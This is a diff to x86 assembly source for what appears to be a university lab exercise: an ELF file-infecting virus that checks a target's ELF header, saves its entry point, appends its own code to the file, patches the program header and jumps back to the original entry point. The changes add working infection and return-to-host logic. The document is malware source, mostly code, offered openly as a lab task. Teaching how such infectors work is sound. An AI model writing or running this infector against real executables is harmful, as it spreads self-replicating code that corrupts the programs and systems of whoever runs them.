@@ -61,13 +61,16 @@
 
 section .text
 
-get_loc_start_func:
-	call insert_loc_to_ecx2
-insert_loc_to_ecx2:
-	pop ecx
-	ret
-
 _start:	
+	call start2
+	get_loc_start_func:
+		call insert_loc_to_ecx2
+	insert_loc_to_ecx2:
+		pop ecx
+		ret
+	start2:
+	pop eax
+
 	push ebp
 	mov	ebp, esp
 	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
@@ -76,6 +79,7 @@ _start:
 	%define file_size ebp-8
 	%define location_of_insert ebp-12
 	%define code_size ebp-16
+	%define jmp_to ebp-20
 	%define p_header ebp-STK_RES+PHDR_size
 	%define s_top ebp-STK_RES
 	;++++++++
@@ -113,24 +117,27 @@ cont:
 	read dword [fd], eax, SIZE_OF_ELF_HEADER
 	cmp dword [s_top], 0x464c457f
 	jne VirusExit
-
+check:
 	;save the old entry point
 	mov eax, dword [s_top + ELF_HEADER_TO_ENTRY]
-	mov ebx, dword [location_of_insert]
-	add ebx, 0x38
-	mov dword [ebx], eax
-
+	mov dword [jmp_to], eax
 
 	;write to the end of the file
 	lseek [fd], 0, SEEK_END
 	call get_loc_start_func
-	add ecx, 2
+	sub ecx, 10
 	mov eax, dword [location_of_insert]
-	add eax, 0x3c
+	add eax, 0x3B
 	;size to wirte
 	sub eax, ecx
 	mov dword [code_size], eax
-	write [fd], ecx, eax
+		; write the code
+		sub eax, 3
+		write [fd], ecx, eax
+		; write program return adress after this code
+		lea ecx, [jmp_to]
+		write [fd], ecx, 4
+	
 get_phdr:
 	;read phdr
 	;get the offset from the elf header
@@ -138,7 +145,7 @@ get_phdr:
 	lseek [fd], eax, SEEK_SET
 	lea eax, [p_header]
 	read dword [fd], eax, PHDR_size
-check:
+
 	;new file size
 	mov ebx, dword [file_size]
 	add ebx, dword [code_size]
@@ -171,6 +178,17 @@ check:
 	;close the file
 	close [fd]
 
+	; restore the return address and call it
+	mov eax, dword [location_of_insert]
+	add eax, 0x38
+	mov ebx, [eax]
+
+	; organize the data
+	add esp, STK_RES
+	pop ebp
+check2:
+	; call the return function
+	call ebx
 ; You code for this lab goes here
 
 VirusExit:
